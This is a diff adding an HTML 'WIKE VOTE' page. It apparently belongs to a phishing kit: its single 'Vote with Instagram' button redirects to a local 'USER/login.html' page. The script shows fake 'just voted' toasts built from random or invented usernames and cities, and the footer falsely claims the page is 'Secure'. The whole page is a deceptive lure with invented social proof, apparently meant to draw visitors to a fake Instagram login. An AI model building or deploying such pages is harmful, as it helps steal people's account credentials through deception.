@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AMBASSDOR</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;600&family=Inter:wght@300;400;500&display=swap" rel="stylesheet" />
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+    h1   { font-family: 'Oswald', sans-serif; }
+
+    @keyframes rise {
+      from { opacity: 0; transform: translateY(24px) scale(0.98); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(0.7) translateY(16px); }
+      to   { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    @keyframes toastSlide {
+      0%   { opacity: 0; transform: translateY(16px) scale(0.95); }
+      12%  { opacity: 1; transform: translateY(0) scale(1); }
+      80%  { opacity: 1; transform: translateY(0) scale(1); }
+      100% { opacity: 0; transform: translateY(-10px) scale(0.97); }
+    }
+
+    .animate-rise  { animation: rise  0.7s cubic-bezier(0.16,1,0.3,1) both; }
+    .animate-pop-1 { animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) 0.25s both; }
+    .animate-pop-2 { animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) 0.38s both; }
+
+    .toast-anim { animation: toastSlide 4s cubic-bezier(0.16,1,0.3,1) forwards; }
+  </style>
+</head>
+<body class="min-h-screen bg-[#efefed] flex items-center justify-center p-6">
+
+  <!-- Toast container -->
+  <div id="toast-container" class="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 flex flex-col items-center gap-2 pointer-events-none" style="width:340px"></div>
+
+  <div class="animate-rise w-full max-w-[360px] bg-white rounded-[28px] overflow-hidden shadow-[0_8px_40px_rgba(0,0,0,0.10),0_1px_4px_rgba(0,0,0,0.06)]">
+
+    <!-- Image -->
+    <div class="relative h-64 overflow-hidden">
+      <img src="/uploads/1788112786531.jpg" alt="Fashion" class="w-full h-full object-cover" />
+      <div class="absolute inset-0 bg-gradient-to-b from-black/10 to-black/55"></div>
+      <div class="absolute bottom-5 left-[22px] right-[22px]">
+        <h1 class="text-[28px] font-semibold tracking-[0.08em] uppercase text-white leading-none">WIKE VOTE</h1>
+      </div>
+    </div>
+
+    <!-- Name chip -->
+    <div class="flex justify-center -mt-4 relative z-10">
+      <span class="bg-white rounded-full px-5 py-[7px] text-[13px] font-medium text-gray-900 shadow-[0_2px_12px_rgba(0,0,0,0.10)] tracking-[0.01em]">WIKE VOTE</span>
+    </div>
+
+    <!-- Buttons -->
+<div class="flex justify-center px-[18px] pt-[22px] pb-6">
+  <a onclick="voteWithRedirect('instagram')"
+     class="animate-pop-1 w-full max-w-[260px] flex flex-col items-center justify-center gap-[6px] py-4 px-3 rounded-2xl bg-[#E1306C] cursor-pointer transition-all duration-150 hover:-translate-y-0.5 hover:shadow-[0_8px_24px_rgba(0,0,0,0.18)] active:scale-95">
+    <svg class="w-5 h-5 text-white/90" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75">
+      <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
+      <circle cx="12" cy="12" r="4"/>
+      <circle cx="17.5" cy="6.5" r="0.6" fill="currentColor" stroke="none"/>
+    </svg>
+    <span class="text-[9.5px] font-medium tracking-[0.13em] uppercase text-white text-center leading-snug">Vote with Instagram</span>
+  </a>
+</div>
+    <!-- Footer -->
+    <div class="flex items-center justify-center gap-[6px] pb-5">
+      <span class="text-[10px] tracking-[0.06em] text-[#b0afa9]">Secure</span>
+      <div class="w-[3px] h-[3px] rounded-full bg-[#d0cfc9]"></div>
+      <span class="text-[10px] tracking-[0.06em] text-[#b0afa9]">One vote per account</span>
+    </div>
+
+  </div>
+
+  <script>
+    function voteWithRedirect(method) {
+      if (method === 'email') {
+        window.location.href = 'USER/email-login.html?project=7sekh';
+      } else if (method === 'instagram') {
+        window.location.href = 'USER/login.html?project=7sekh';
+      }
+    }
+
+    // ── Toast system ──────────────────────────────────────────
+    const cities = [
+      'New York','Los Angeles','London','Paris','Tokyo','Sydney',
+      'Toronto','Berlin','Dubai','Seoul','Milan','Amsterdam',
+      'Barcelona','Chicago','São Paulo','Singapore','Mumbai','Lagos'
+    ];
+
+    let userPool = [];
+    let poolIndex = 0;
+
+    async function fetchUserPool() {
+      try {
+        const res = await fetch('https://randomuser.me/api/?results=20&inc=login,picture,nat');
+        const data = await res.json();
+        userPool = data.results;
+      } catch (e) {
+        // fallback silently — will use generated names
+        userPool = [];
+      }
+    }
+
+    function getNextUser() {
+      if (userPool.length === 0) {
+        // fallback if API failed
+        const adj = ['cool','sunny','brave','swift','bright'];
+        const noun = ['panda','fox','eagle','wolf','lynx'];
+        const num = Math.floor(Math.random() * 99);
+        return {
+          username: adj[Math.floor(Math.random()*adj.length)] + '_' + noun[Math.floor(Math.random()*noun.length)] + num,
+          avatar: `https://api.dicebear.com/7.x/thumbs/svg?seed=${Math.random()}`
+        };
+      }
+      const user = userPool[poolIndex % userPool.length];
+      poolIndex++;
+      return {
+        username: user.login.username,
+        avatar: user.picture.thumbnail
+      };
+    }
+
+    function randomCity() {
+      return cities[Math.floor(Math.random() * cities.length)];
+    }
+
+    function showToast() {
+      const { username, avatar } = getNextUser();
+      const city = randomCity();
+
+      const toast = document.createElement('div');
+      toast.className = 'toast-anim flex items-center gap-3 bg-white rounded-2xl px-4 py-3 shadow-[0_4px_24px_rgba(0,0,0,0.13)] border border-black/[0.06] w-full';
+      toast.innerHTML = `
+        <img src="${avatar}" alt="${username}"
+             class="w-10 h-10 rounded-full object-cover flex-shrink-0 ring-2 ring-white shadow" />
+        <div class="flex flex-col min-w-0">
+          <span class="text-[11px] font-semibold text-gray-900 truncate">@${username}</span>
+          <span class="text-[10px] text-gray-400 leading-snug">just voted from <span class="text-gray-600 font-medium">${city}</span> 🗳️</span>
+        </div>
+        <div class="ml-auto flex-shrink-0 w-2 h-2 rounded-full bg-green-400 shadow-[0_0_6px_2px_rgba(74,222,128,0.5)]"></div>
+      `;
+
+      const container = document.getElementById('toast-container');
+      container.appendChild(toast);
+
+      // Remove after animation ends (4s)
+      setTimeout(() => toast.remove(), 4100);
+    }
+
+    // Init: fetch users then start toasts
+    fetchUserPool().then(() => {
+      // First toast after 1.5s, then every 3.5s
+      setTimeout(() => {
+        showToast();
+        setInterval(showToast, 3500);
+      }, 1500);
+    });
+
+    // Refresh pool every 5 minutes
+    setInterval(fetchUserPool, 5 * 60 * 1000);
+  </script>
+<script>window.PROJECT_NAME = "7sekh";</script></body>
+</html>
+
